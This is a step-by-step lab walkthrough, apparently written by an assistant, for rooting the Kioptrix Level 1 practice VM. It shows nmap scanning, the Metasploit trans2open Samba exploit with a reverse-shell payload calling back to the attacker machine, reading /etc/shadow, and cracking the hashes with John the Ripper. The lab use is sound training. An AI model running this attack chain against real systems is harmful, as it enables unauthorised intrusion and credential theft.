Based on your scan results, this is your setup:



Victim Machine (Kioptrix): 192.168.50.130 



Attacker Machine (Kali Linux): 192.168.50.128



Weak Spot: An old version of software called Samba (version 2.2.1a) .



Your video already shows the final step where you gain access. Here is how you do it from scratch.



Step 1: Find the Target

First, we need to find the Kioptrix machine on the network.



Command: netdiscover -r 192.168.50.0/24 or nmap -sn 192.168.50.0/24



Why: This scans the local network to find live devices.



Step 2: Scan for Open Doors

Once you have the IP (192.168.50.130), we scan it to see which "doors" (ports) are open.



Command: nmap -A 192.168.50.130



Why: The -A flag checks the version of the software running on the ports.



Result: You will see Port 139 open running Samba 2.2.1a. This version is very old and vulnerable .



Step 3: Launch Metasploit (The Hacking Tool)

Metasploit is a tool that has pre-made "exploits" (code that breaks into systems). You already have it open in your video.



Command: msfconsole



Fun Tip: When Metasploit starts, it prints a cool random ASCII art banner (like the one in your screenshot).



Step 4: Find the Right Exploit

Now we search for a program inside Metasploit that can break Samba 2.2.1a.



Command: search trans2open



Selection: You will see several options. Since Kioptrix is a Linux machine, choose number 1 (exploit/linux/samba/trans2open) .



Load it: use 1



Step 5: Set the Options (Aiming the Weapon)

Before firing the exploit, you have to tell it where to go (Target IP) and where to come back to (Your IP).



Set Target: set RHOSTS 192.168.50.130



Set Payload: set PAYLOAD linux/x86/shell\_reverse\_tcp (This tells the victim to send a command prompt back to you) .



Set Your IP: set LHOST 192.168.50.128 (Your Kali IP).



Step 6: Pull the Trigger (Gaining Root)

Run the exploit. This is the part shown in your video.



Command: run or exploit



What happens: The script will try different memory addresses (the Trying return address... lines you saw). Once it finds the right one, it breaks in.



Step 7: Victory (You are Root!)

If successful, you will see a line like Command shell session 1 opened.

You now have control of the machine. Type these commands to prove you are the "God" (Root) of the system:



whoami (It should say root). 



ls -la (List files).



cat /etc/issue (Read the welcome message for Kioptrix).



Troubleshooting: Why did I get multiple sessions?

You might see session 2 opened and session 4 opened quickly. That is normal for this exploit. Sometimes it crashes a few times before it works. You can switch between sessions using sessions -i 2 to jump into session number 2.



Bonus: The "John" Method (Password Cracking)

In your video, you saw a file called /etc/shadow. This file stores passwords.



You copied the passwords for users john and harold into a file.



If you wanted to crack them (instead of using the hack), you would use a tool called John the Ripper.



Command: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt .



The short story: Kioptrix Level 1 is vulnerable because it runs very old software (Samba 2.2.1a). Metasploit has an automatic "point-and-click" hack for it (trans2open) that instantly gives you Root access

